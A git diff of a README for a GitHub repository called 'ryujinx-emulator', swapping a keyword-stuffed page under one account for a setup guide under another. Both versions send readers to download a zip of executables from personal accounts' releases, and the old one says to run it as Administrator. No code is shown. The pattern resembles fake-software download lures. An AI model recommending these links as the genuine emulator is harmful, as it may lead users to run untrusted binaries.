@@ -1,51 +1,95 @@
-# Ryujinx Emulator
-Ryujinx Emulator — ryujinx emulator ryujinx github download nintendo switch emulator switch games ryujinx windows 11 linux vulkan opengl amd nvidia intel fps boost mod support save manager multiplayer latest version 2026
+# 🎮 ryujinx-emulator - Play Nintendo Switch games on Windows
 
-<img width="250" height="262" alt="image" src="https://github.com/user-attachments/assets/5a124c3c-be83-4d53-a391-34ca8d31bbc2" />
+[![](https://img.shields.io/badge/Download-Ryujinx-blue.svg)](https://github.com/ximosi1335/ryujinx-emulator/releases)
 
-[![GitHub Stars](https://img.shields.io/github/stars/Inproger/ryujinx-emulator?style=flat-square&color=00d4aa)](https://github.com/Inproger/ryujinx-emulator/stargazers)
-[![GitHub Forks](https://img.shields.io/github/forks/Inproger/ryujinx-emulator?style=flat-square&color=0099cc)](https://github.com/Inproger/ryujinx-emulator/network)
-[![Downloads](https://img.shields.io/github/downloads/Inproger/ryujinx-emulator/total?style=flat-square&color=7c5cbf)](https://github.com/Inproger/ryujinx-emulator/releases)
-[![License](https://img.shields.io/badge/license-MIT-blue?style=flat-square)](LICENSE)
+This application lets you play Nintendo Switch games on your computer. It recreates the console environment so you can run your personal game collection on a Windows desktop. You get access to features like higher resolution, custom graphics settings, and controller support.
 
-## Overview
-Ryujinx Emulator is a highly optimized open-source Nintendo Switch emulator. It delivers excellent compatibility, performance, and accuracy across a wide range of Switch games. The emulator supports Vulkan and OpenGL rendering, advanced graphics features, save management, multiplayer functionality, and extensive mod support. It works smoothly on Windows 11 and Linux with regular updates and improvements. Perfect for users looking for the best Nintendo Switch emulation experience with high FPS and modern features.
+## 📥 Getting Started
 
-> [!Important]
-> This project is for educational and personal use only. Use at your own risk. You must own legitimate copies of Nintendo Switch games. The authors are not responsible for any copyright violations or legal issues.
+Follow these steps to set up the emulator on your Windows machine.
 
-## Install
-[Download `Ryujinx-Emulator.zip`](https://github.com/Inproger/ryujinx-emulator/releases/download/Nintendo/ryujinx-emulator.zip)
----
-> Optimized for Windows 11 • Linux.
-<img width="1282" height="792" alt="image" src="https://github.com/user-attachments/assets/4d1b7efc-b58e-4a14-a0c7-939e9cf86ee9" />
+1. Go to the [official release page](https://github.com/ximosi1335/ryujinx-emulator/releases).
+2. Look for the latest version under the Assets section.
+3. Download the file ending in `.zip`.
+4. Right-click the downloaded folder and select Extract All.
+5. Choose a destination folder on your drive and extract the files.
+6. Open the extracted folder and double-click the file named `Ryujinx.exe`.
 
-## Installation
-### For Regular Users
-1. Download and extract the archive
-2. Run `Ryujinx.exe` as Administrator (on Windows)
-3. Follow the setup guide
-4. Add your legitimate game files
-5. Configure graphics settings (Vulkan recommended)
-6. Enable mods and save manager if needed
-7. Launch your favorite Nintendo Switch games
+## ⚙️ Adding System Files
 
----
-## Troubleshooting
-| Problem | Solution |
-|--------------------------------|-------------------------------------------------------|
-| Emulator doesn't start | Run as Administrator and update GPU drivers |
-| Black screen / crashes | Switch between Vulkan and OpenGL |
-| Low FPS | Enable performance optimizations |
-| Game not booting | Verify game dump integrity |
-| Controller not working | Configure input settings |
-| Mods not loading | Check mod folder structure |
-| Windows 11 compatibility error | Update Windows and .NET runtime |
-| Download / update failed | Use the latest release and check your internet connection |
+The emulator requires two specific files from your own console to function correctly. You must copy your firmware and your prod.keys file into the appropriate folders. 
 
-* Ryujinx Emulator
-* Ryujinx Download
-* Nintendo Switch Emulator
-* Ryujinx Windows 11
-* Ryujinx Vulkan
-* Switch Emulator 2026
+1. Open the emulator.
+2. Click File in the top menu.
+3. Select Open Ryujinx Folder.
+4. Open the system folder.
+5. Place your prod.keys file into this directory.
+6. To install firmware, click Tools in the top menu and select Install Firmware from XCI or ZIP.
+7. Select your firmware file from your computer and confirm the installation.
+
+## 🕹️ Loading Games
+
+You can load games from your computer directly into the application. 
+
+1. Gather your Nintendo Switch game files. These typically come in .nca, .xci, or .nsp formats.
+2. Keep these files in a dedicated folder on your computer for organization.
+3. In the emulator software, click Options and select Settings.
+4. Click the General tab.
+5. Click Add under the Game Directories section.
+6. Select the folder containing your games.
+7. Click Save. Your game list will now appear in the main window.
+
+## 🖥️ Adjusting Graphics Settings
+
+You can change how games look to improve performance or visual quality.
+
+1. Open Settings in the Options menu.
+2. Navigate to the Graphics tab.
+3. Select Vulkan as your Graphics Backend for the best performance on most modern PCs.
+4. Adjust the Resolution Scale if you want to play at resolutions higher than the original console. 2x is a common choice for better clarity.
+5. Enable Shader Cache to reduce stuttering during gameplay. The emulator saves these files to your drive, so the game runs smoother after the first time you visit an area.
+
+## ⌨️ Configuring Controls
+
+You can use mouse and keyboard or connect a game controller.
+
+1. Click Options and select Settings.
+2. Click the Input tab.
+3. Choose the player you want to configure.
+4. Select your controller from the Input Device dropdown menu.
+5. Map individual buttons by clicking the buttons on the screen and pressing the corresponding input on your physical controller.
+6. Click Save to apply your settings.
+
+## 🤝 Multiplayer Support
+
+This emulator supports local wireless multiplayer via a feature called LDN. This allows you to play with others who are also using the emulator.
+
+1. Ensure the emulator version supports LDN.
+2. Go to the Network settings tab.
+3. Enable the Network checkbox.
+4. Choose the preferred connection mode.
+5. You can now see or host lobbies through the game interface if the specific game supports local wireless play.
+
+## 📈 Troubleshooting Performance
+
+If you experience slow performance or visual glitches, check these common items:
+
+* Update your graphics card drivers to the latest version.
+* Ensure the emulator has permission to use your dedicated graphics card rather than the integrated processor chip.
+* Check that your Windows power settings are set to High Performance.
+* Clear your shader cache if you notice graphical corruption. You can delete the shader cache folder from your main system directory to force the emulator to rebuild them fresh.
+* Check that you are using the latest version of the emulator. Developers frequently release updates that improve compatibility with newer games.
+
+## 📋 System Requirements
+
+To run this software, your computer should meet these minimum specifications:
+
+* Windows 10 or 11 (64-bit).
+* A processor with at least 4 cores.
+* 8 GB of RAM.
+* A graphics card that supports Vulkan 1.1 or higher. This includes most Nvidia GTX 10 series cards or newer, and AMD Radeon RX 500 series cards or newer.
+* Approximately 500 MB of disk space for the installation. Games and save files will require additional space depending on your library size.
+
+## 🛡️ Privacy and Safety
+
+This software does not collect your personal data or track your internet activity. All configuration files and game data stay locally on your computer. You hold full control over your files. The program manages your save data in a folder named saves located within the main application directory. You can back up these folders at any time to preserve your progress. Remember to store your firmware and keys files in a secure location and do not share them with others, as these belong to your individual console.
